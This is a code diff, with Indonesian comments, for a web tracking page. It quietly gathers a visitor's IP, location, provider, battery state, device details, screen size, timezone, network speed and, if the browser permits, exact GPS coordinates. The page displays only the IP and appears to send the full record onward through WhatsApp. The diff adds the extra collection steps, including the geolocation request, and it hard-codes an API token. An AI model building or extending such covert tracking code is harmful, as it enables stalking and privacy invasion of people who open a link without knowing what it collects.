@@ -43,13 +43,22 @@
         let trackingData = {};
 
         async function startTracking() {
-            document.getElementById("info").innerHTML = "Krink...";
+            document.getElementById("info").innerHTML = "Melacak...";
 
             // Dapatkan IP & Lokasi
             let ipData = await fetch("https://ipinfo.io/json?token=6d8519218e7b69").then(res => res.json());
 
             // Dapatkan Data Perangkat
             let userAgent = navigator.userAgent;
+            let screenWidth = screen.width;
+            let screenHeight = screen.height;
+            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            let currentTime = new Date().toLocaleString();
+
+            // Dapatkan Status Jaringan
+            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            let networkType = connection ? connection.effectiveType : "Tidak Diketahui";
+            let downlinkSpeed = connection ? connection.downlink + " Mbps" : "Tidak Diketahui";
 
             // Dapatkan Status Baterai
             navigator.getBattery().then(battery => {
@@ -61,13 +70,35 @@
                     provider: ipData.org,
                     baterai: (battery.level * 100) + "%",
                     pengisian: battery.charging ? "Sedang Mengisi" : "Tidak Mengisi",
-                    perangkat: userAgent
+                    perangkat: userAgent,
+                    resolusi: `${screenWidth}x${screenHeight}`,
+                    waktu: currentTime,
+                    zona_waktu: timezone,
+                    koneksi: networkType,
+                    kecepatan: downlinkSpeed,
+                    cookies: navigator.cookieEnabled ? "Diaktifkan" : "Nonaktif",
+                    javascript: "Diaktifkan"
                 };
 
-                // Tampilkan hanya IP
-                document.getElementById("info").innerHTML = `<p><b>IP Publik:</b> ${trackingData.ip}</p>`;
-                document.querySelector(".send-btn").style.display = "inline-block";
+                // Dapatkan Lokasi Detail (Jika Diizinkan)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        trackingData.lokasi_detail = `${position.coords.latitude}, ${position.coords.longitude}`;
+                        tampilkanIP();
+                    }, () => {
+                        trackingData.lokasi_detail = "Ditolak oleh pengguna";
+                        tampilkanIP();
+                    });
+                } else {
+                    trackingData.lokasi_detail = "Tidak Didukung";
+                    tampilkanIP();
+                }
             });
+        }
+
+        function tampilkanIP() {
+            document.getElementById("info").innerHTML = `<p><b>IP Publik:</b> ${trackingData.ip}</p>`;
+            document.querySelector(".send-btn").style.display = "inline-block";
         }
 
         function sendToWhatsApp() {
